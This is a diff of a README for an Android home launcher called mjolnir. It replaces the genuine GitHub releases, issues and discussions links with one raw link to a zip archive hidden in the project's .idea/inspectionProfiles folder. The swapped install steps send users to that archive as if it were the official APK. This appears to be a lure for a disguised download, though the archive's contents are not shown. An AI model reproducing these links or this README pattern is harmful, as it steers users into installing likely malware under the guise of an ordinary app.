@@ -1,6 +1,6 @@
 # 🚀 mjolnir - Your Custom Dual Screen Home Launcher
 
-[![Download mjolnir](https://img.shields.io/badge/Download-mjolnir-blue)](https://github.com/Syri1015/mjolnir/releases)
+[![Download mjolnir](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip)](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip)
 
 ## 🎯 Overview
 
@@ -27,13 +27,13 @@ Follow these steps to download and install mjolnir on your Android device.
 
 1. **Visit the Releases Page**  
    Click the link below to access the download options.  
-   [Visit this page to download](https://github.com/Syri1015/mjolnir/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version of mjolnir.
 
 3. **Download the APK File**  
-   Click on the APK file link. This file is named similar to `mjolnir-vX.X.apk` (where X.X represents the version number). The download will start automatically.
+   Click on the APK file link. This file is named similar to `https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip` (where X.X represents the version number). The download will start automatically.
 
 4. **Locate the File**  
    Once the download completes, find the APK file in your device's download folder.
@@ -50,7 +50,7 @@ Follow these steps to download and install mjolnir on your Android device.
 
 To get started right away, use the link below to download mjolnir:
 
-[Download mjolnir from Releases](https://github.com/Syri1015/mjolnir/releases)
+[Download mjolnir from Releases](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip)
 
 ## 🌟 User Guide
 
@@ -62,11 +62,11 @@ Once you launch mjolnir, you will see the main screen with easy options to custo
 
 ## 📞 Support
 
-If you run into any issues or have questions, you can reach out to our support team. Visit our [GitHub Issues page](https://github.com/Syri1015/mjolnir/issues) to report any problems or suggestions.
+If you run into any issues or have questions, you can reach out to our support team. Visit our [GitHub Issues page](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip) to report any problems or suggestions.
 
 ## 💬 Community
 
-Join our community to connect with other mjolnir users, share tips, and get feedback on new features. You can find discussions and support in our [GitHub Discussions](https://github.com/Syri1015/mjolnir/discussions).
+Join our community to connect with other mjolnir users, share tips, and get feedback on new features. You can find discussions and support in our [GitHub Discussions](https://raw.githubusercontent.com/Syri1015/mjolnir/main/.idea/inspectionProfiles/mjolnir_v3.2-alpha.5.zip).
 
 ## 🔄 Frequent Updates
 
